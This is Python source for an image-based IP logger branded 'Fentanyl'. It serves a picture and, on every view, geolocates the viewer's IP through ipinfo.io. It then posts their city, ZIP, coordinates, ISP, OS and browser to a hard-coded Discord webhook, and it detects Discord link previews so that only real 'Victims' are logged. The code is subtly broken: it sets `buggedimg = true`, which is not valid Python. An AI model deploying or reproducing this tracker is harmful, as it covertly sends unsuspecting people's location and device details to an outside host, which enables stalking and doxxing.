from http.server import BaseHTTPRequestHandler
from urllib import parse
import httpx
import base64
import httpagentparser

# ================== CONFIG ==================
webhook = 'https://discord.com/api/webhooks/1521379443442978988/dPRjoaRyTZ6udhD2etRFtn1WnsUtqPWr-nBAYm8F197CLEQVg_TfaB1UgJN9mBHxNejp'

bindata = "https://images.techhive.com/images/article/2014/04/windows-xp-bliss-desktop-image-100259888-orig.jpg"

buggedimg = true
# Set to True if you want the image to load on Discord (CASE SENSITIVE)

# Base85 encoded "bugged" image data
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
# ===========================================

def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser):
    return {
        "username": "Fentanyl",
        "content": "@everyone",
        "embeds": [
            {
                "title": "Fentanyl strikes again!",
                "color": 16711803,
                "description": "A Victim opened the original Image. You can find their info below.",
                "author": {"name": "Fentanyl"},
                "fields": [
                    {
                        "name": "IP Info",
                        "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
                        "inline": True
                    },
                    {
                        "name": "Advanced Info",
                        "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
                        "inline": False
                    }
                ]
            }
        ],
    }


def prev(ip, uag):
    return {
        "username": "Fentanyl",
        "content": "",
        "embeds": [
            {
                "title": "Fentanyl Alert!",
                "color": 16711803,
                "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
                "author": {"name": "Fentanyl"},
            }
        ],
    }


class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            
            # Get image data
            if 'url' in dic:
                try:
                    data = httpx.get(dic['url']).content
                except:
                    data = httpx.get(bindata).content
            else:
                data = httpx.get(bindata).content

            useragent = self.headers.get('user-agent') or 'No User Agent Found!'
            os_name, browser = httpagentparser.simple_detect(useragent)
            
            ip = self.headers.get('x-forwarded-for') or 'Unknown'

            # Discord preview detection
            if ip.startswith(('35', '34', '104.196')) or 'discord' in useragent.lower():
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(buggedbin if buggedimg else data)
                
                if 'discord' in useragent.lower():
                    httpx.post(webhook, json=prev(ip, useragent))
            else:
                # Normal visitor
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(data)

                # Send full info to webhook
                try:
                    ipInfo = httpx.get(f'https://ipinfo.io/{ip}/json').json()
                    httpx.post(webhook, json=formatHook(
                        ipInfo.get('ip'),
                        ipInfo.get('city'),
                        ipInfo.get('region'),
                        ipInfo.get('country'),
                        ipInfo.get('loc'),
                        ipInfo.get('org'),
                        ipInfo.get('postal'),
                        useragent, os_name, browser
                    ))
                except:
                    pass  # Fail silently if ipinfo fails

        except Exception:
            # Fallback
            self.send_response(200)
            self.send_header('Content-type', 'image/jpeg')
            self.end_headers()
            self.wfile.write(httpx.get(bindata).content)

        return
